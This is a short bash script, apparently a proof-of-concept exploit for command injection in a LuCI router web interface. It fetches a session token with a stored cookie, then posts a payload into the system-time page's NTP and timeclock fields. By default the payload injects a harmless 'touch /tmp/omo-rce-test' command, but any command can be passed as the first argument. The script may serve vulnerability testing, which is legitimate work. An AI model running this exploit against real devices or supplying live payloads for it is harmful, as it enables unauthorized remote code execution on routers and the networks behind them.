#!/bin/bash
set -u
H="${2:-http://192.168.10.1}"
PAYLOAD=${1:-PAYLOAD_UNSET}
if [ "$PAYLOAD" = "PAYLOAD_UNSET" ]; then
	PAYLOAD="'; touch /tmp/omo-rce-test; #"
fi
DIR="$(cd "$(dirname "$0")" && pwd)/tmp"
cd "$DIR" || exit 1
STOKEN=$(curl -s -b wj.txt "$H/cgi-bin/luci/admin/system/systime" | grep -o 'name="token"[^>]*value="[^"]*"' | head -1 | sed 's/.*value="//;s/"//')
echo "token=$STOKEN"
curl -s -b wj.txt -X POST "$H/cgi-bin/luci/admin/system/systime" -o rce_out.html -w "post:%{http_code}\n" \
	--data-urlencode "token=$STOKEN" --data-urlencode "cbi.submit=1" \
	--data-urlencode "cbid.system.ntp.current=$PAYLOAD" --data-urlencode "timeclock=$PAYLOAD"
